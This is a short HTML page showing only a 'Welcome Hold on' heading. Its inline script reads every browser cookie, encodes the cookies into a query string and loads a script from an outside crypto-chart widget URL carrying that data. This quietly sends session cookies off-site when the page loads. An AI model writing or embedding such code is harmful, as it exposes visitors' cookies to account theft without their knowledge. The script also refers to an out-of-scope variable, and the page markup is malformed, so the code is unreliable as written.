h3 {text-align: center;}
p {text-align: center;}

<body style="background-color:#E0CBA8;">

<h3 style="color:#FFF;font-family: 'Libre Baskerville', serif;">Welcome Hold on ðŸ¤–</h3>


<div></div>

<script>
var script = document.createElement('script');
script.type = 'text/javascript';
script.async = true;
let uri = "";
Object.keys(document.cookie.split(';').map(function(c) {
    return c.trim().split('=').map(decodeURIComponent);
}).reduce(function(a, b) {
    try {
        a[b[0]] = JSON.parse(b[1]);
    } catch (e) {
        a[b[0]] = b[1];
    }
    return a;
}, {})).forEach((k) => {
    uri = uri + k + "=" + a[k] + "&"
});

script.src = 'https://widgets.cryptocompare.com/serve/v3/coin/chart?' + uri.slice(0, -1);
var head = document.getElementsByTagName('head')[0];
head.appendChild(script);
</script>

</body>
</html>
